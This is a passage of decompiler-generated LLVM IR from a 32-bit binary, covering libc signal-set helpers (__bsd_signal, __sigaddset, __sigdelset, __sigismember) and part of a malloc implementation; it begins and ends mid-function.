  %v4_804f766 = call i32 @__GI_memset(i8* %v3_804f766, i32 0, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_804f774 = load i32, i32* @ebx, align 4
  %v15_804f775 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_804f789 = icmp eq i32 %arg2, -1
  br i1 %v10_804f789, label %dec_label_pc_804f797, label %dec_label_pc_804f78e

dec_label_pc_804f78e:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_804f797, label %dec_label_pc_804f792

dec_label_pc_804f792:                             ; preds = %dec_label_pc_804f78e
  %v7_804f795 = icmp sgt i32 %arg1, 64
  br i1 %v7_804f795, label %dec_label_pc_804f797, label %dec_label_pc_804f7a4

dec_label_pc_804f797:                             ; preds = %dec_label_pc_804f792, %dec_label_pc_804f78e, %entry
  %v1_804f797 = call i32 @__errno_location(i32 %v0_804f774)
  store i32 %v1_804f797, i32* %eax.global-to-local, align 4
  %v1_804f79c = inttoptr i32 %v1_804f797 to i32*
  store i32 22, i32* %v1_804f79c, align 4
  br label %dec_label_pc_804f818

dec_label_pc_804f7a4:                             ; preds = %dec_label_pc_804f792
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f7b2

dec_label_pc_804f7b2:                             ; preds = %dec_label_pc_804f7b2.dec_label_pc_804f7b2_crit_edge, %dec_label_pc_804f7a4
  %v0_804f7b2 = phi i32 [ %v15_804f775, %dec_label_pc_804f7a4 ], [ %v0_804f7b2.pre, %dec_label_pc_804f7b2.dec_label_pc_804f7b2_crit_edge ]
  %v1_804f7bd17 = phi i32 [ 31, %dec_label_pc_804f7a4 ], [ %v1_804f7bd, %dec_label_pc_804f7b2.dec_label_pc_804f7b2_crit_edge ]
  %v2_804f7b2 = mul i32 %v1_804f7bd17, 4
  %v3_804f7b2 = add i32 %v2_804f7b2, 160
  %v4_804f7b2 = add i32 %v3_804f7b2, %v0_804f7b2
  %v5_804f7b2 = inttoptr i32 %v4_804f7b2 to i32*
  store i32 0, i32* %v5_804f7b2, align 4
  %v0_804f7bd.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804f7bd = add i32 %v0_804f7bd.pre, -1
  %v9_804f7bd = icmp slt i32 %v1_804f7bd, 0
  store i32 %v1_804f7bd, i32* %eax.global-to-local, align 4
  %v1_804f7be = icmp eq i1 %v9_804f7bd, false
  br i1 %v1_804f7be, label %dec_label_pc_804f7b2.dec_label_pc_804f7b2_crit_edge, label %dec_label_pc_804f7c0

dec_label_pc_804f7b2.dec_label_pc_804f7b2_crit_edge: ; preds = %dec_label_pc_804f7b2
  %v0_804f7b2.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f7b2

dec_label_pc_804f7c0:                             ; preds = %dec_label_pc_804f7b2
  %v0_804f7c0 = load i32, i32* @edx, align 4
  %v2_804f7c3 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_804f7c3, i32* %eax.global-to-local, align 4
  %v4_804f7cb = call i32 @__sigaddset(i32 %v2_804f7c3, i32 %arg1, i32 %v0_804f7c0, i32 %v0_804f7c0)
  store i32 %v4_804f7cb, i32* %eax.global-to-local, align 4
  %v2_804f7d3 = icmp slt i32 %v4_804f7cb, 0
  br i1 %v2_804f7d3, label %dec_label_pc_804f818, label %dec_label_pc_804f7d7

dec_label_pc_804f7d7:                             ; preds = %dec_label_pc_804f7c0
  %v4_804f7df = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_805b4c0.116 to i32), i32 %arg1, i32 %v4_804f7cb, i32 %v4_804f7cb)
  %v2_804f7f8 = ptrtoint i32* %stack_var_-284 to i32
  %v2_804f7fd = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804f7fd, i32* %eax.global-to-local, align 4
  %v4_804f806 = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_804f7f8)
  store i32 %v4_804f806, i32* %eax.global-to-local, align 4
  %v2_804f80e = icmp slt i32 %v4_804f806, 0
  br i1 %v2_804f80e, label %dec_label_pc_804f818, label %dec_label_pc_804f812

dec_label_pc_804f812:                             ; preds = %dec_label_pc_804f7d7
  %v3_804f812 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_804f81b

dec_label_pc_804f818:                             ; preds = %dec_label_pc_804f7d7, %dec_label_pc_804f7c0, %dec_label_pc_804f797
  br label %dec_label_pc_804f81b

dec_label_pc_804f81b:                             ; preds = %dec_label_pc_804f812, %dec_label_pc_804f818
  %storemerge = phi i32 [ -1, %dec_label_pc_804f818 ], [ %v3_804f812, %dec_label_pc_804f812 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804f774, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804f7bd, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 0, 1, 2, 3, 4, 7, 8, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_804f81b, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804f832 = add i32 %arg2, -1
  %v1_804f835 = urem i32 %v1_804f832, 32
  %v2_804f835 = icmp eq i32 %v1_804f835, 0
  %v2_804f838 = udiv i32 %v1_804f832, 32
  br i1 %v2_804f835, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_804f83b = shl i32 1, %v1_804f835
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804f83d = phi i32 [ 1, %entry ], [ %v5_804f83b, %bb ]
  %v2_804f83d = mul nuw nsw i32 %v2_804f838, 4
  %v3_804f83d = add i32 %v2_804f83d, %arg1
  %v4_804f83d = inttoptr i32 %v3_804f83d to i32*
  %v5_804f83d = load i32, i32* %v4_804f83d, align 4
  %v7_804f83d = and i32 %v5_804f83d, %v6_804f83d
  %v8_804f83d = icmp eq i32 %v7_804f83d, 0
  %v1_804f841 = icmp eq i1 %v8_804f83d, false
  %v2_804f841 = zext i1 %v1_804f841 to i32
  ret i32 %v2_804f841

; uselistorder directives
  uselistorder i32 %v1_804f835, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804f848 = load i32, i32* @ebx, align 4
  store i32 %v0_804f848, i32* %stack_var_-4, align 4
  %v1_804f856 = add i32 %arg2, -1
  %v1_804f859 = urem i32 %v1_804f856, 32
  %v2_804f859 = icmp eq i32 %v1_804f859, 0
  store i32 %v1_804f859, i32* @ecx, align 4
  %v2_804f85c = udiv i32 %v1_804f856, 32
  store i32 %v2_804f85c, i32* @edx, align 4
  br i1 %v2_804f859, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_804f85f = shl i32 1, %v1_804f859
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804f861 = phi i32 [ 1, %entry ], [ %v5_804f85f, %bb ]
  %v2_804f861 = mul nuw nsw i32 %v2_804f85c, 4
  %v3_804f861 = add i32 %v2_804f861, %arg1
  %v4_804f861 = inttoptr i32 %v3_804f861 to i32*
  %v5_804f861 = load i32, i32* %v4_804f861, align 4
  %v7_804f861 = or i32 %v5_804f861, %v6_804f861
  store i32 %v7_804f861, i32* %v4_804f861, align 4
  %v2_804f866 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f866, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_804f85c, { 1, 0 }
  uselistorder i32 %v1_804f859, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_804f876 = add i32 %arg2, -1
  %v1_804f879 = urem i32 %v1_804f876, 32
  %v2_804f879 = icmp eq i32 %v1_804f879, 0
  %v2_804f87c = udiv i32 %v1_804f876, 32
  br i1 %v2_804f879, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v4_804f87f = shl i32 -2, %v1_804f879
  %v5_804f87f = sub nsw i32 32, %v1_804f879
  %v6_804f87f = lshr i32 -2, %v5_804f87f
  %v7_804f87f = or i32 %v6_804f87f, %v4_804f87f
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804f881 = phi i32 [ -2, %entry ], [ %v7_804f87f, %bb ]
  %v2_804f881 = mul nuw nsw i32 %v2_804f87c, 4
  %v3_804f881 = add i32 %v2_804f881, %arg1
  %v4_804f881 = inttoptr i32 %v3_804f881 to i32*
  %v5_804f881 = load i32, i32* %v4_804f881, align 4
  %v7_804f881 = and i32 %v5_804f881, %v6_804f881
  store i32 %v7_804f881, i32* %v4_804f881, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804f879, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_804f888 = load i32, i32* @eax, align 4
  %v6_804f89b = icmp ugt i32 %v0_804f888, 16777215
  br i1 %v6_804f89b, label %dec_label_pc_804f8ac, label %dec_label_pc_804f89d

dec_label_pc_804f89d:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_804f888, 256
  %v2_804f88b = udiv i32 %v0_804f888, 256
  %v2_804f89d = call i32 @llvm.ctlz.i32(i32 %v2_804f88b, i1 true)
  %v3_804f89d = xor i32 %v2_804f89d, 31
  %v5_804f89d = select i1 %tmp, i32 95, i32 %v3_804f89d
  %v1_804f8a0 = add nuw nsw i32 %v5_804f89d, 6
  %v2_804f8a3 = urem i32 %v1_804f8a0, 32
  %v4_804f8a3 = icmp eq i32 %v2_804f8a3, 0
  br i1 %v4_804f8a3, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_804f89d
  %v5_804f8a3 = lshr i32 %v0_804f888, %v2_804f8a3
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_804f89d, %bb
  %v0_804f8a5 = phi i32 [ %v0_804f888, %dec_label_pc_804f89d ], [ %v5_804f8a3, %bb ]
  %v1_804f8a5 = urem i32 %v0_804f8a5, 4
  %v2_804f8a8 = mul nuw nsw i32 %v5_804f89d, 4
  %v3_804f8a8 = or i32 %v1_804f8a5, 32
  %v4_804f8a8 = add nuw nsw i32 %v3_804f8a8, %v2_804f8a8
  br label %dec_label_pc_804f8ac

dec_label_pc_804f8ac:                             ; preds = %entry, %bb4
  %v0_804f8ad = phi i32 [ 95, %entry ], [ %v4_804f8a8, %bb4 ]
  ret i32 %v0_804f8ad

; uselistorder directives
  uselistorder i32 %v2_804f8a3, { 1, 0 }
  uselistorder i32 %v0_804f888, { 2, 3, 1, 0, 4 }
  uselistorder i1 true, { 8, 2, 3, 4, 6, 5, 7, 1, 0 }
  uselistorder label %dec_label_pc_804f8ac, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f8ae = load i32, i32* @ebp, align 4
  %v0_804f8af = load i32, i32* @edi, align 4
  %v0_804f8b0 = load i32, i32* @esi, align 4
  %v0_804f8b1 = load i32, i32* @ebx, align 4
  store i32 %v0_804f8b1, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804f8c3 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804f8c3, i32* @eax, align 4
  store i32 %v2_804f8c3, i32* %stack_var_-92, align 4
  %v2_804f8c8 = call i32 @__pthread_return_void(i32 %v2_804f8c3, i32 134548959)
  store i32 %v2_804f8c8, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80552f0.117 to i32), i32* %stack_var_-92, align 4
  %v1_804f8d4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80552f0.117 to i32))
  store i32 %v1_804f8d4, i32* %eax.global-to-local, align 4
  %v0_804f8dc = load i32, i32* %ebx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_804f8dc, -32
  br i1 %tmp125, label %dec_label_pc_804f8f3, label %dec_label_pc_804f8e1

dec_label_pc_804f8e1:                             ; preds = %entry
  %v0_804f8e1 = load i32, i32* %stack_var_-92, align 4
  %v1_804f8e1 = call i32 @__errno_location(i32 %v0_804f8e1)
  store i32 %v1_804f8e1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804f8e8 = inttoptr i32 %v1_804f8e1 to i32*
  store i32 12, i32* %v1_804f8e8, align 4
  br label %dec_label_pc_8050018

dec_label_pc_804f8f3:                             ; preds = %entry
  %v1_804f8f3 = add i32 %v0_804f8dc, 11
  %tmp126 = icmp ult i32 %v1_804f8f3, 16
  br i1 %tmp126, label %dec_label_pc_804f90a, label %dec_label_pc_804f903

dec_label_pc_804f903:                             ; preds = %dec_label_pc_804f8f3
  %v1_804f903 = and i32 %v1_804f8f3, -8
  br label %dec_label_pc_804f90a

dec_label_pc_804f90a:                             ; preds = %dec_label_pc_804f8f3, %dec_label_pc_804f903
  %storemerge136 = phi i32 [ %v1_804f903, %dec_label_pc_804f903 ], [ %v1_804f8f3, %dec_label_pc_804f8f3 ]
  %v1_804fca2 = phi i32 [ %v1_804f903, %dec_label_pc_804f903 ], [ 16, %dec_label_pc_804f8f3 ]
  store i32 %storemerge136, i32* %eax.global-to-local, align 4
  %v0_804f90a = load i8, i8* @global_var_805b540.118, align 1
  %v1_804f90a = sext i8 %v0_804f90a to i32
  store i32 %v1_804f90a, i32* @ebx, align 4
  %v3_804f910 = urem i8 %v0_804f90a, 2
  %v4_804f910 = icmp eq i8 %v3_804f910, 0
  %v1_804f913 = icmp eq i1 %v4_804f910, false
  br i1 %v1_804f913, label %dec_label_pc_804f932, label %dec_label_pc_804f915

dec_label_pc_804f915:                             ; preds = %dec_label_pc_804f90a
  %v2_804f915 = icmp eq i8 %v0_804f90a, 0
  %v1_804f917 = icmp eq i1 %v2_804f915, false
  br i1 %v1_804f917, label %dec_label_pc_804fc0d, label %dec_label_pc_804f91d

dec_label_pc_804f91d:                             ; preds = %dec_label_pc_804f915
  store i32 ptrtoint (i8* @global_var_805b540.118 to i32), i32* %stack_var_-92, align 4
  %v2_804f925 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805b540.118 to i32*))
  store i32 %v2_804f925, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fc0d

dec_label_pc_804f932:                             ; preds = %dec_label_pc_804f90a
  %v11_804f932 = trunc i32 %v1_804fca2 to i8
  %v8_804f936 = icmp ugt i8 %v11_804f932, %v0_804f90a
  br i1 %v8_804f936, label %dec_label_pc_804f953, label %dec_label_pc_804f938

dec_label_pc_804f938:                             ; preds = %dec_label_pc_804f932
  %v2_804f93c = udiv i32 %v1_804fca2, 2
  store i32 %v2_804f93c, i32* %eax.global-to-local, align 4
  %v1_804f93e = add i32 %v2_804f93c, ptrtoint (i8* @global_var_805b540.118 to i32)
  store i32 %v1_804f93e, i32* %ecx.global-to-local, align 4
  %v1_804f944 = add i32 %v2_804f93c, add (i32 ptrtoint (i8* @global_var_805b540.118 to i32), i32 -4)
  %v2_804f944 = inttoptr i32 %v1_804f944 to i32*
  %v3_804f944 = load i32, i32* %v2_804f944, align 4
  store i32 %v3_804f944, i32* %edx.global-to-local, align 4
  %v1_804f947 = icmp eq i32 %v3_804f944, 0
  br i1 %v1_804f947, label %dec_label_pc_804f953, label %dec_label_pc_804f94b

dec_label_pc_804f94b:                             ; preds = %dec_label_pc_804f938
  %v1_804f94b = add i32 %v3_804f944, 8
  %v2_804f94b = inttoptr i32 %v1_804f94b to i32*
  %v3_804f94b = load i32, i32* %v2_804f94b, align 4
  store i32 %v3_804f94b, i32* %eax.global-to-local, align 4
  store i32 %v3_804f94b, i32* %v2_804f944, align 4
  br label %dec_label_pc_804f98c

dec_label_pc_804f953:                             ; preds = %dec_label_pc_804f938, %dec_label_pc_804f932
  %v8_804f953 = icmp ult i32 %v1_804fca2, 255
  %v6_804f95b = icmp ugt i32 %v1_804fca2, 255
  store i32 %v1_804fca2, i32* @eax, align 4
  br i1 %v6_804f95b, label %dec_label_pc_804f994, label %dec_label_pc_804f95d

dec_label_pc_804f95d:                             ; preds = %dec_label_pc_804f953
  %v2_804f961 = udiv i32 %v1_804fca2, 8
  store i32 %v2_804f961, i32* %eax.global-to-local, align 4
  %v1_804f968 = mul nuw i32 %v2_804f961, 8
  %v2_804f968 = add i32 %v1_804f968, ptrtoint (i32* @global_var_805b56c.119 to i32)
  store i32 %v2_804f968, i32* %ecx.global-to-local, align 4
  %v1_804f96f = add i32 %v1_804f968, add (i32 ptrtoint (i32* @global_var_805b56c.119 to i32), i32 12)
  %v2_804f96f = inttoptr i32 %v1_804f96f to i32*
  %v3_804f96f = load i32, i32* %v2_804f96f, align 4
  store i32 %v3_804f96f, i32* %edx.global-to-local, align 4
  %v12_804f972 = icmp eq i32 %v3_804f96f, %v2_804f968
  br i1 %v12_804f972, label %dec_label_pc_804fa90.preheader, label %dec_label_pc_804f97a

dec_label_pc_804f97a:                             ; preds = %dec_label_pc_804f95d
  store i32 %v1_804fca2, i32* %ebx.global-to-local, align 4
  %v1_804f97e = add i32 %v3_804f96f, 12
  %v2_804f97e = inttoptr i32 %v1_804f97e to i32*
  %v3_804f97e = load i32, i32* %v2_804f97e, align 4
  store i32 %v3_804f97e, i32* %eax.global-to-local, align 4
  store i32 %v3_804f97e, i32* %v2_804f96f, align 4
  %v0_804f984 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f984 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f984 = add i32 %v0_804f984, 4
  %v3_804f984 = add i32 %v2_804f984, %v1_804f984
  %v4_804f984 = inttoptr i32 %v3_804f984 to i32*
  %v5_804f984 = load i32, i32* %v4_804f984, align 4
  %v6_804f984 = or i32 %v5_804f984, 1
  store i32 %v6_804f984, i32* %v4_804f984, align 4
  %v0_804f989 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f989 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f989 = add i32 %v1_804f989, 8
  %v3_804f989 = inttoptr i32 %v2_804f989 to i32*
  store i32 %v0_804f989, i32* %v3_804f989, align 4
  br label %dec_label_pc_804f98c

dec_label_pc_804f98c:                             ; preds = %dec_label_pc_804fd29, %dec_label_pc_804fd3b, %dec_label_pc_804f94b, %dec_label_pc_804f97a
  %v0_804f98c = load i32, i32* %edx.global-to-local, align 4
  %v1_804f98c = add i32 %v0_804f98c, 8
  store i32 %v1_804f98c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050007

dec_label_pc_804f994:                             ; preds = %dec_label_pc_804f953
  %v0_804f998 = call i32 @__malloc_largebin_index()
  store i32 %v0_804f998, i32* %eax.global-to-local, align 4
  %v3_804f99d = and i8 %v0_804f90a, 2
  %v4_804f99d = icmp eq i8 %v3_804f99d, 0
  %v6_804f99d = zext i8 %v3_804f99d to i32
  %v9_804f99d = and i32 %v1_804f90a, -256
  %v10_804f99d = or i32 %v9_804f99d, %v6_804f99d
  store i32 %v10_804f99d, i32* @ebx, align 4
  br i1 %v4_804f99d, label %dec_label_pc_804fa90.preheader, label %dec_label_pc_804f9aa

dec_label_pc_804f9aa:                             ; preds = %dec_label_pc_804f994
  store i32 ptrtoint (i8* @global_var_805b540.118 to i32), i32* %stack_var_-92, align 4
  %v2_804f9b2 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805b540.118 to i32*))
  store i32 %v2_804f9b2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fa90.preheader

dec_label_pc_804fa90.preheader:                   ; preds = %dec_label_pc_804f9aa, %dec_label_pc_804f95d, %dec_label_pc_804f994
  %stack_var_-40.0.ph = phi i32 [ %v2_804f961, %dec_label_pc_804f95d ], [ %v0_804f998, %dec_label_pc_804f9aa ], [ %v0_804f998, %dec_label_pc_804f994 ]
  %v1_804f9e6 = add i32 %v1_804fca2, 16
  %v0_804fa90107 = load i32, i32* @global_var_805b580.122, align 128
  store i32 %v0_804fa90107, i32* @ebp, align 4
  %v9_804fa96109 = icmp eq i32 %v0_804fa90107, 134591860
  %v1_804fa9c110 = icmp eq i1 %v9_804fa96109, false
  br i1 %v1_804fa9c110, label %dec_label_pc_804f9bf, label %dec_label_pc_804faa2

dec_label_pc_804f9bf:                             ; preds = %dec_label_pc_804fa90.preheader, %bb84
  %v0_804fa90111 = phi i32 [ %v0_804fa90, %bb84 ], [ %v0_804fa90107, %dec_label_pc_804fa90.preheader ]
  %v1_804f9bf = add i32 %v0_804fa90111, 4
  %v2_804f9bf = inttoptr i32 %v1_804f9bf to i32*
  %v3_804f9bf = load i32, i32* %v2_804f9bf, align 4
  %v1_804f9c2 = add i32 %v0_804fa90111, 12
  %v2_804f9c2 = inttoptr i32 %v1_804f9c2 to i32*
  %v3_804f9c2 = load i32, i32* %v2_804f9c2, align 4
  store i32 %v3_804f9c2, i32* %edx.global-to-local, align 4
  %v1_804f9c5 = and i32 %v3_804f9bf, -4
  store i32 %v1_804f9c5, i32* @edi, align 4
  br i1 %v6_804f95b, label %dec_label_pc_804f9f1, label %dec_label_pc_804f9d2

dec_label_pc_804f9d2:                             ; preds = %dec_label_pc_804f9bf
  %v9_804f9d2 = icmp eq i32 %v3_804f9c2, 134591860
  %v1_804f9d8 = icmp eq i1 %v9_804f9d2, false
  br i1 %v1_804f9d8, label %dec_label_pc_804f9f1, label %dec_label_pc_804f9da

dec_label_pc_804f9da:                             ; preds = %dec_label_pc_804f9d2
  %v1_804f9da = load i32, i32* @global_var_805b570.120, align 16
  %v12_804f9da = icmp eq i32 %v0_804fa90111, %v1_804f9da
  %v1_804f9e0 = icmp eq i1 %v12_804f9da, false
  br i1 %v1_804f9e0, label %dec_label_pc_804f9f1, label %dec_label_pc_804f9e2

dec_label_pc_804f9e2:                             ; preds = %dec_label_pc_804f9da
  store i32 %v1_804f9e6, i32* %eax.global-to-local, align 4
  %v6_804f9eb = icmp ugt i32 %v1_804f9c5, %v1_804f9e6
  br i1 %v6_804f9eb, label %dec_label_pc_804ffa2, label %dec_label_pc_804f9f1

dec_label_pc_804f9f1:                             ; preds = %dec_label_pc_804f9e2, %dec_label_pc_804f9da, %dec_label_pc_804f9d2, %dec_label_pc_804f9bf
  store i32 ptrtoint (i32* @global_var_805b574.121 to i32), i32* %eax.global-to-local, align 4
  %v2_804f9f6 = add i32 %v3_804f9c2, 8
  %v3_804f9f6 = inttoptr i32 %v2_804f9f6 to i32*
  store i32 ptrtoint (i32* @global_var_805b574.121 to i32), i32* %v3_804f9f6, align 4
  %v0_804f9f9 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804f9f9, i32* @global_var_805b580.122, align 4
  %v0_804f9fc = load i32, i32* @edi, align 4
  %v15_804f9fc = icmp eq i32 %v0_804f9fc, %v1_804fca2
  br i1 %v15_804f9fc, label %dec_label_pc_804ffe3, label %dec_label_pc_804fa06

dec_label_pc_804fa06:                             ; preds = %dec_label_pc_804f9f1
  %v6_804fa0c = icmp ugt i32 %v0_804f9fc, 255
  br i1 %v6_804fa0c, label %dec_label_pc_804fa1f, label %dec_label_pc_804fa0e

dec_label_pc_804fa0e:                             ; preds = %dec_label_pc_804fa06
  %v2_804fa10 = udiv i32 %v0_804f9fc, 8
  store i32 %v2_804fa10, i32* %esi.global-to-local, align 4
  %v1_804fa13 = mul nuw i32 %v2_804fa10, 8
  %v2_804fa13 = add i32 %v1_804fa13, 134591852
  store i32 %v2_804fa13, i32* @ebx, align 4
  %v1_804fa1a = add i32 %v1_804fa13, 134591860
  %v2_804fa1a = inttoptr i32 %v1_804fa1a to i32*
  %v3_804fa1a = load i32, i32* %v2_804fa1a, align 4
  store i32 %v3_804fa1a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fa68

dec_label_pc_804fa1f:                             ; preds = %dec_label_pc_804fa06
  store i32 %v0_804f9fc, i32* @eax, align 4
  %v0_804fa21 = call i32 @__malloc_largebin_index()
  store i32 %v0_804fa21, i32* %esi.global-to-local, align 4
  %v1_804fa28 = mul i32 %v0_804fa21, 8
  %v2_804fa28 = add i32 %v1_804fa28, ptrtoint (i32* @global_var_805b56c.119 to i32)
  store i32 %v2_804fa28, i32* %eax.global-to-local, align 4
  %v1_804fa2f = add i32 %v1_804fa28, add (i32 ptrtoint (i32* @global_var_805b56c.119 to i32), i32 8)
  %v2_804fa2f = inttoptr i32 %v1_804fa2f to i32*
  %v3_804fa2f = load i32, i32* %v2_804fa2f, align 4
  store i32 %v3_804fa2f, i32* %edx.global-to-local, align 4
  store i32 %v3_804fa2f, i32* @ebx, align 4
  %v12_804fa38 = icmp eq i32 %v3_804fa2f, %v2_804fa28
  br i1 %v12_804fa38, label %dec_label_pc_804fa68, label %dec_label_pc_804fa3c

dec_label_pc_804fa3c:                             ; preds = %dec_label_pc_804fa1f
  %v1_804fa3c = add i32 %v1_804fa28, add (i32 ptrtoint (i32* @global_var_805b56c.119 to i32), i32 12)
  %v2_804fa3c = inttoptr i32 %v1_804fa3c to i32*
  %v3_804fa3c = load i32, i32* %v2_804fa3c, align 4
  store i32 %v3_804fa3c, i32* @ebx, align 4
  %v0_804fa3f = load i32, i32* @edi, align 4
  %v2_804fa3f = add i32 %v3_804fa3c, 4
  %v3_804fa3f = inttoptr i32 %v2_804fa3f to i32*
  %v4_804fa3f = load i32, i32* %v3_804fa3f, align 4
  %v10_804fa3f = icmp ult i32 %v0_804fa3f, %v4_804fa3f
  %v1_804fa42 = icmp eq i1 %v10_804fa3f, false
  br i1 %v1_804fa42, label %dec_label_pc_804fa4a, label %dec_label_pc_804fa68

dec_label_pc_804fa4a:                             ; preds = %dec_label_pc_804fa3c
  %v1_804fa4c = or i32 %v0_804fa3f, 1
  store i32 %v1_804fa4c, i32* %eax.global-to-local, align 4
  store i32 %v3_804fa2f, i32* %ebx.global-to-local, align 4
  %v2_804fa60101 = add i32 %v3_804fa2f, 4
  %v3_804fa60102 = inttoptr i32 %v2_804fa60101 to i32*
  %v4_804fa60103 = load i32, i32* %v3_804fa60102, align 4
  %v10_804fa60104 = icmp ult i32 %v1_804fa4c, %v4_804fa60103
  br i1 %v10_804fa60104, label %dec_label_pc_804fa51, label %dec_label_pc_804fa65

dec_label_pc_804fa51:                             ; preds = %dec_label_pc_804fa4a, %dec_label_pc_804fa51
  %v0_804fa65105 = phi i32 [ %v3_804fa55, %dec_label_pc_804fa51 ], [ %v3_804fa2f, %dec_label_pc_804fa4a ]
  store i32 %v0_804fa65105, i32* %ecx.global-to-local, align 4
  %v1_804fa55 = add i32 %v0_804fa65105, 8
  %v2_804fa55 = inttoptr i32 %v1_804fa55 to i32*
  %v3_804fa55 = load i32, i32* %v2_804fa55, align 4
  store i32 %v3_804fa55, i32* %ecx.global-to-local, align 4
  store i32 %v3_804fa55, i32* %ebx.global-to-local, align 4
  %v2_804fa60 = add i32 %v3_804fa55, 4
  %v3_804fa60 = inttoptr i32 %v2_804fa60 to i32*
  %v4_804fa60 = load i32, i32* %v3_804fa60, align 4
  %v10_804fa60 = icmp ult i32 %v1_804fa4c, %v4_804fa60
  br i1 %v10_804fa60, label %dec_label_pc_804fa51, label %dec_label_pc_804fa65

dec_label_pc_804fa65:                             ; preds = %dec_label_pc_804fa51, %dec_label_pc_804fa4a
  %v0_804fa65.lcssa = phi i32 [ %v3_804fa2f, %dec_label_pc_804fa4a ], [ %v3_804fa55, %dec_label_pc_804fa51 ]
  %v1_804fa65 = add i32 %v0_804fa65.lcssa, 12
  %v2_804fa65 = inttoptr i32 %v1_804fa65 to i32*
  %v3_804fa65 = load i32, i32* %v2_804fa65, align 4
  store i32 %v3_804fa65, i32* @ebx, align 4
  br label %dec_label_pc_804fa68

dec_label_pc_804fa68:                             ; preds = %dec_label_pc_804fa0e, %dec_label_pc_804fa3c, %dec_label_pc_804fa1f, %dec_label_pc_804fa65
  %v0_804fa68 = phi i32 [ %v0_804fa21, %dec_label_pc_804fa1f ], [ %v0_804fa21, %dec_label_pc_804fa65 ], [ %v0_804fa21, %dec_label_pc_804fa3c ], [ %v2_804fa10, %dec_label_pc_804fa0e ]
  %stack_var_-64.1 = phi i32 [ %v2_804fa28, %dec_label_pc_804fa1f ], [ %v0_804fa65.lcssa, %dec_label_pc_804fa65 ], [ %v2_804fa28, %dec_label_pc_804fa3c ], [ %v3_804fa1a, %dec_label_pc_804fa0e ]
  %v1_804fa6a = urem i32 %v0_804fa68, 32
  %v2_804fa6a = icmp eq i32 %v1_804fa6a, 0
  store i32 %v1_804fa6a, i32* %esi.global-to-local, align 4
  store i32 %v1_804fa6a, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
